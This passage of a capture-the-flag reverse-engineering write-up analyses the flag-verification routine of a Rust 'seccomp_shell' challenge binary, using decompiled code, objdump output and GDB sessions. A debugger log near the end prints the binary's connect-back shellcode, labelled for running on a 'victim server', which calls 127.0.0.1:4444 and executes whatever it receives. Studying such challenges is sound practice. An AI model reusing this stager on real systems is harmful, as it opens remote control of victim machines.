+<li>一進去就會看到可能是在檢查 flag 長度的判斷式：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( len != <span class="number">64</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$$RF$str$GT$$GT$::from::<span class="built_in">hc50629fd4c285201</span>();</span><br><span class="line">    <span class="keyword">return</span> v72;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div></li>
+<li>接著是一些不太重要的變數，這裡它把 flag 切成三段：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">commandString = command;</span><br><span class="line">_rust_alloc();</span><br><span class="line"><span class="keyword">if</span> ( !flag_copy )</span><br><span class="line">  alloc::alloc::handle_alloc_error::<span class="built_in">hd36006f171acb99e</span>();</span><br><span class="line">flag_copy2 = flag_copy;</span><br><span class="line">flag_ptr = *flag;</span><br><span class="line">flag_part1 = flag[<span class="number">1</span>];</span><br><span class="line">flag_part2 = flag[<span class="number">2</span>];</span><br><span class="line">flag_copy[<span class="number">3</span>] = flag[<span class="number">3</span>];</span><br><span class="line">flag_copy[<span class="number">2</span>] = flag_part2;</span><br><span class="line">flag_copy[<span class="number">1</span>] = flag_part1;</span><br><span class="line">*flag_copy = flag_ptr;</span><br><span class="line">flag_copy3 = flag_copy;</span><br><span class="line">v88 = <span class="number">64LL</span>;</span><br><span class="line">v89 = <span class="number">64LL</span>;</span><br></pre></td></tr></table></figure></div></li>
+<li>再來包含一個重複 256 次的外部循環，內部由八個一樣的子循環組成，子循環會以 <code>dest</code> 做為映射表，對 flag 內的字符進行交換操作，並且過程是由 flag 的尾部進行到頭部。<br>此外 <code>core::panicking::panic_bounds_check::h7d0e683548e4cb10()</code>是 rust 編譯器引入的一種錯誤處理機制，用來防止索引訪問越界。<br>整理過後，結構大致如下：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  loop_count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++loop_count;</span><br><span class="line">    <span class="comment">// 打亂 flag，並重複八次</span></span><br><span class="line">    <span class="built_in">memcpy</span>(dest, <span class="string">&quot;/&quot;</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">    flag_index_from_tail = <span class="number">64LL</span>;</span><br><span class="line">    dest_index = (__int64 *)dest + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      dest_value1 = *(dest_index - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// swap</span></span><br><span class="line">      <span class="keyword">if</span> ( dest_value1 &gt;= <span class="number">64</span></span><br><span class="line">        || (temp1_1 = *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">1</span>),</span><br><span class="line">            *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">1</span>) = *((_BYTE *)flag_copy2 + dest_value1),</span><br><span class="line">            *((_BYTE *)flag_copy2 + dest_value1) = temp1_1,</span><br><span class="line">            dest_value2 = *dest_index,</span><br><span class="line">            (<span class="type">unsigned</span> __int64)*dest_index &gt; <span class="number">0x3F</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_53:</span><br><span class="line">        core::panicking::panic_bounds_check::<span class="built_in">h7d0e683548e4cb10</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// swap</span></span><br><span class="line">      temp1_2 = *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">2</span>);</span><br><span class="line">      *((_BYTE *)flag_copy2 + flag_index_from_tail - <span class="number">2</span>) = *((_BYTE *)flag_copy2 + dest_value2);</span><br><span class="line">      *((_BYTE *)flag_copy2 + dest_value2) = temp1_2;</span><br><span class="line">      dest_index += <span class="number">2</span>;</span><br><span class="line">      flag_index_from_tail -= <span class="number">2LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( flag_index_from_tail );</span><br></pre></td></tr></table></figure></div></li>
+<li>打亂 flag 後會接一個按位加密的邏輯：<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 按位加密</span></span><br><span class="line">  current_index = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    currentValuePlusOne = *((<span class="type">unsigned</span> __int8 *)flag_copy2 + current_index) + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">LOWORD</span>(intermediateValue) = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">LOWORD</span>(current_index2) = <span class="number">257</span>;</span><br><span class="line">    tempResult = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      current_index3 = current_index2;</span><br><span class="line">      <span class="built_in">LOWORD</span>(current_index2) = (<span class="type">unsigned</span> __int16)current_index2 / (<span class="type">unsigned</span> __int16)currentValuePlusOne;</span><br><span class="line">      modResult = current_index3 % (<span class="type">unsigned</span> __int16)currentValuePlusOne;</span><br><span class="line">      tempCalculation = intermediateValue;</span><br><span class="line">      intermediateValue = tempResult - (_DWORD)intermediateValue * (_DWORD)current_index2;</span><br><span class="line">      <span class="built_in">LODWORD</span>(current_index2) = currentValuePlusOne;</span><br><span class="line">      currentValuePlusOne = (<span class="type">unsigned</span> __int16)(current_index3 % (<span class="type">unsigned</span> __int16)currentValuePlusOne);</span><br><span class="line">      tempResult = tempCalculation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( modResult );</span><br><span class="line">    finalAdjustment = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (__int16)tempCalculation &gt; <span class="number">0</span> )</span><br><span class="line">      finalAdjustment = tempCalculation;</span><br><span class="line">    finalResult = (<span class="type">unsigned</span> __int16)(finalAdjustment + ((__int16)tempCalculation &gt;&gt; <span class="number">15</span>) - tempCalculation) / <span class="number">0x101</span>u</span><br><span class="line">                + tempCalculation</span><br><span class="line">                + ((<span class="type">unsigned</span> __int16)tempCalculation &gt;&gt; <span class="number">15</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(finalResult) = ((<span class="type">unsigned</span> __int16)(finalAdjustment + ((__int16)tempCalculation &gt;&gt; <span class="number">15</span>) - tempCalculation)</span><br><span class="line">                         / <span class="number">0x101</span>u</span><br><span class="line">                         + tempCalculation</span><br><span class="line">                         + ((<span class="type">unsigned</span> __int16)tempCalculation &gt;&gt; <span class="number">15</span>)</span><br><span class="line">                         + <span class="number">113</span>) ^ <span class="number">0x89</span>;</span><br><span class="line">    *((_BYTE *)flag_copy2 + current_index) = finalResult;</span><br><span class="line">    current_index2 = current_index + <span class="number">1</span>;</span><br><span class="line">    current_index = current_index2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( current_index2 != <span class="number">64</span> ); <span class="comment">// flag 長度</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( loop_count != <span class="number">256</span> );</span><br></pre></td></tr></table></figure></div></li>
+<li>寫了 255 個 bytes 到一塊新的空間還有寫 64 個 bytes 到 <code>dest</code>，後面還有一些 TCP 的交互，但具體還看不出來在幹嘛：</li>
+</ol>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 分配 255 字節的內存</span></span><br><span class="line">allocatedMemory = (<span class="type">void</span> *)alloc::raw_vec::RawVec$LT$T$C$A$GT$::allocate_in::<span class="built_in">h9362616e9151d1f3</span>(</span><br><span class="line">                              <span class="number">255LL</span>,</span><br><span class="line">                              <span class="number">0LL</span>,</span><br><span class="line">                              finalResult,</span><br><span class="line">                              <span class="number">64LL</span>,</span><br><span class="line">                              tempCalculation,</span><br><span class="line">                              intermediateValue);</span><br><span class="line">  tempResult1 = tempResult3;</span><br><span class="line">  <span class="comment">// 把某段資料拷貝到剛剛的內存</span></span><br><span class="line">  <span class="built_in">memcpy</span>(allocatedMemory, &amp;unk_62B2B, <span class="number">0xFF</span>uLL);</span><br><span class="line">  memoryBuffer = allocatedMemory;</span><br><span class="line">  tempResult2 = tempResult1;</span><br><span class="line">  dataLength1 = <span class="number">255LL</span>;</span><br><span class="line">  alloc::vec::Vec$LT$T$C$A$GT$::resize::<span class="built_in">h7362553f00beaec8</span>(&amp;memoryBuffer, <span class="number">255LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(commandString + <span class="number">16</span>) == <span class="number">-1</span> )</span><br><span class="line">    core::panicking::panic::<span class="built_in">h65157a6ac7f1357a</span>();</span><br><span class="line">  commandOffset = commandString + <span class="number">16</span>;</span><br><span class="line">  <span class="comment">// 寫 64 bytes 到 dest</span></span><br><span class="line">  dest[<span class="number">0</span>] = xmmword_60010;</span><br><span class="line">  dest[<span class="number">1</span>] = xmmword_60020;</span><br><span class="line">  dest[<span class="number">2</span>] = xmmword_60030;</span><br><span class="line">  dest[<span class="number">3</span>] = xmmword_60040;</span><br><span class="line">  dataLength = dataLength1;</span><br><span class="line">  <span class="comment">// 根據不同的 dataLength 執行不同的邏輯</span></span><br><span class="line">  <span class="keyword">if</span> ( dataLength1 &lt; <span class="number">0xCD</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">  memoryBuffer1 = memoryBuffer;</span><br><span class="line">  memoryBuffer[<span class="number">204</span>] = *(_BYTE *)flag_copy2;</span><br><span class="line">  <span class="keyword">if</span> ( dataLength &lt; <span class="number">0xE0</span></span><br><span class="line">    || (memoryBuffer1[<span class="number">223</span>] = <span class="number">-89</span>, memoryBuffer1[<span class="number">205</span>] = *((_BYTE *)flag_copy2 + <span class="number">1</span>), dataLength == <span class="number">224</span>)</span><br><span class="line">    || (memoryBuffer1[<span class="number">224</span>] = <span class="number">81</span>, memoryBuffer1[<span class="number">206</span>] = *((_BYTE *)flag_copy2 + <span class="number">2</span>), dataLength &lt; <span class="number">0xE2</span>)</span><br><span class="line">    || (memoryBuffer1[<span class="number">225</span>] = <span class="number">104</span>, memoryBuffer1[<span class="number">207</span>] = *((_BYTE *)flag_copy2 + <span class="number">3</span>), dataLength == <span class="number">226</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_74:</span><br><span class="line">    core::panicking::panic_bounds_check::<span class="built_in">h7d0e683548e4cb10</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  memoryBuffer1[<span class="number">226</span>] = <span class="number">82</span>;</span><br><span class="line">  <span class="comment">// 透過 tcp 發送數據</span></span><br><span class="line">  _$LT$$RF$std..net..tcp..TcpStream$u20$as$u20$std..io..Write$GT$::write::<span class="built_in">h0bbfc2d1fa700c7a</span>();</span><br><span class="line">  <span class="keyword">if</span> ( readBuffer[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_50:</span><br><span class="line">    <span class="comment">// 讀取狀態有錯時，進行錯誤處理</span></span><br><span class="line">    errorResponse = _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$E$GT$$GT$::from::<span class="built_in">ha6d5ca9d25f6de13</span>(readBuffer[<span class="number">1</span>]);</span><br><span class="line">LABEL_71:</span><br><span class="line">    errorResponse1 = errorResponse;</span><br><span class="line">    <span class="keyword">if</span> ( tempResult2 )</span><br><span class="line">      _rust_dealloc();</span><br><span class="line">    _rust_dealloc();</span><br><span class="line">    <span class="keyword">return</span> errorResponse1;</span><br><span class="line">  &#125;</span><br><span class="line">  readBuffer[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="comment">// 正常情況下的數據操作</span></span><br><span class="line">  readResult = std::io::default_read_exact::<span class="built_in">h61fb53e2a02eb302</span>(&amp;commandOffset, readBuffer, <span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( readResult )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_55:</span><br><span class="line">    errorResponse = _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$E$GT$$GT$::from::<span class="built_in">ha6d5ca9d25f6de13</span>(readResult);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_71;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !readBuffer[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_70:</span><br><span class="line">    <span class="comment">// 讀取狀態正常，但是數據不符合預期，進行錯誤處理</span></span><br><span class="line">    _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$$RF$str$GT$$GT$::from::<span class="built_in">hc50629fd4c285201</span>();</span><br><span class="line">    <span class="keyword">goto</span> LABEL_71;</span><br><span class="line">  &#125;</span><br><span class="line">  dataOffset = <span class="number">4LL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    dataLength2 = dataLength1;</span><br><span class="line">    <span class="keyword">if</span> ( dataLength1 &lt; <span class="number">0xCD</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    tempKeyPart = *(_DWORD *)((<span class="type">char</span> *)dest + dataOffset);</span><br><span class="line">    memoryBuffer2 = memoryBuffer;</span><br><span class="line">    memoryBuffer[<span class="number">204</span>] = *((_BYTE *)flag_copy2 + dataOffset);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 &lt; <span class="number">0xE0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">223</span>] = tempKeyPart;</span><br><span class="line">    memoryBuffer2[<span class="number">205</span>] = *((_BYTE *)flag_copy2 + dataOffset + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 == <span class="number">224</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">224</span>] = <span class="built_in">BYTE1</span>(tempKeyPart);</span><br><span class="line">    memoryBuffer2[<span class="number">206</span>] = *((_BYTE *)flag_copy2 + dataOffset + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 &lt; <span class="number">0xE2</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">225</span>] = <span class="built_in">BYTE2</span>(tempKeyPart);</span><br><span class="line">    memoryBuffer2[<span class="number">207</span>] = *((_BYTE *)flag_copy2 + dataOffset + <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dataLength2 == <span class="number">226</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    memoryBuffer2[<span class="number">226</span>] = <span class="built_in">HIBYTE</span>(tempKeyPart);</span><br><span class="line">    _$LT$$RF$std..net..tcp..TcpStream$u20$as$u20$std..io..Write$GT$::write::<span class="built_in">h0bbfc2d1fa700c7a</span>();</span><br><span class="line">    <span class="keyword">if</span> ( readBuffer[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">    readBuffer[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">    readResult = std::io::default_read_exact::<span class="built_in">h61fb53e2a02eb302</span>(&amp;commandOffset, readBuffer, <span class="number">8LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( readResult )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">    <span class="keyword">if</span> ( !readBuffer[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_70;</span><br><span class="line">    iterationValid = (<span class="type">unsigned</span> __int64)(dataOffset + <span class="number">1</span>) &lt;= <span class="number">0x3C</span>;</span><br><span class="line">    dataOffset += <span class="number">4LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( iterationValid );</span><br><span class="line">  <span class="comment">// 釋放資源</span></span><br><span class="line">  <span class="keyword">if</span> ( tempResult2 )</span><br><span class="line">    _rust_dealloc();</span><br><span class="line">  _rust_dealloc();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h2 id="0x3-Exploitation"><a href="#0x3-Exploitation" class="headerlink" title="0x3 Exploitation"></a>0x3 Exploitation</h2><ol>
+<li>首先是要搞清楚打亂順序，這部分可以透過直接比較指定輸入和動態分析打亂結果來得知映射表：</li>
+</ol>
+<ul>
+<li>先紀錄 <code>verify()</code> 的 symbol：</li>
+</ul>
+<p>從 IDA 看</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; __int64 __fastcall seccomp_shell::shell::verify::<span class="built_in">h898bf5fa26dafbab</span>(__int64 command, __int128 *flag, __int64 len)</span><br><span class="line">.text:<span class="number">0000000000012</span>C70 _ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE proc near</span><br><span class="line">.text:<span class="number">0000000000012</span>C70                                         ; CODE XREF: seccomp_shell::shell::prompt::h76cecfe7bd3bdf50+E30↓p</span><br></pre></td></tr></table></figure></div>
+<p>用 objdump 也行：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ objdump -d ./blade | grep verify</span><br><span class="line">0000000000012c70 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE&gt;:</span><br><span class="line">   12c85:       0f 85 6e 05 00 00       jne    131f9 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x589&gt;</span><br><span class="line">   12cb0:       0f 84 be 07 00 00       je     13474 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x804&gt;</span><br><span class="line">   12d38:       0f 83 eb 04 00 00       jae    13229 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x5b9&gt;</span><br><span class="line">   12d56:       0f 87 <span class="built_in">cd</span> 04 00 00       ja     13229 &lt;_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE+0x5b9&gt;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure></div>
+<p>得 <code>_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE</code>。</p>
+<ul>
+<li>下斷點：</li>
+</ul>
+<p>斷點下的位置要選在八個換位子循環後，按位加密前，之後我們會再模擬重複 256 次</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000012FFC                 movzx   edx, byte ptr [rbx+rax-2]</span><br><span class="line">.text:0000000000013001                 movzx   esi, byte ptr [rbx+rdi]</span><br><span class="line">.text:0000000000013005                 mov     [rbx+rax-2], sil</span><br><span class="line">.text:000000000001300A                 mov     [rbx+rdi], dl</span><br><span class="line">.text:000000000001300D                 add     rcx, 10h</span><br><span class="line">.text:0000000000013011                 add     rax, 0FFFFFFFFFFFFFFFEh</span><br><span class="line">.text:0000000000013015                 jnz     short loc_12FD0</span><br><span class="line">.text:0000000000013017                 xor     ecx, ecx</span><br><span class="line">.text:0000000000013019                 nop     dword ptr [rax+00000000h]</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)*v53 &gt; <span class="number">0x3F</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">  v57 = *((_BYTE *)flag_copy2 + current_index2 - <span class="number">2</span>);</span><br><span class="line">  *((_BYTE *)flag_copy2 + current_index2 - <span class="number">2</span>) = *((_BYTE *)flag_copy2 + v56);</span><br><span class="line">  *((_BYTE *)flag_copy2 + v56) = v57;</span><br><span class="line">  v53 += <span class="number">2</span>;</span><br><span class="line">  current_index2 -= <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( current_index2 );</span><br><span class="line">current_index = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure></div>
+<p>這邊選 <code>xor     ecx, ecx</code>，也就是 <code>current_index</code> 歸零的地方，IDA 可以看到位址是 <code>seccomp_shell::shell::verify::h898bf5fa26dafbab	 + 3A7</code>，flag 的位置從前幾行可以得知在 $rbx。</p>
+<ul>
+<li>GDB 看打亂順序，輸入 <code>1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</code> (10 + 26 + 26 + 2 &#x3D; 64) 觀察，擷取重要部份如下：</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">└─$ gdb -q ./blade</span><br><span class="line">gef➤  starti</span><br><span class="line">gef➤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x3A7</span><br><span class="line">Breakpoint 1 at 0x555555567017</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line"><span class="comment"># ./shellcode</span></span><br><span class="line">[+] Connection established from 127.0.0.1:33568</span><br><span class="line">$ flag 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000555555567017 <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gef➤  x/s <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: <span class="string">&quot;HfVl&#123;qPcCYNMoRi7D8Jr&#125;espOL4FhwdWAtTGZba5Ugjvnx2QkKE3IS0yuz6BX19m&quot;</span></span><br></pre></td></tr></table></figure></div>
+<ul>
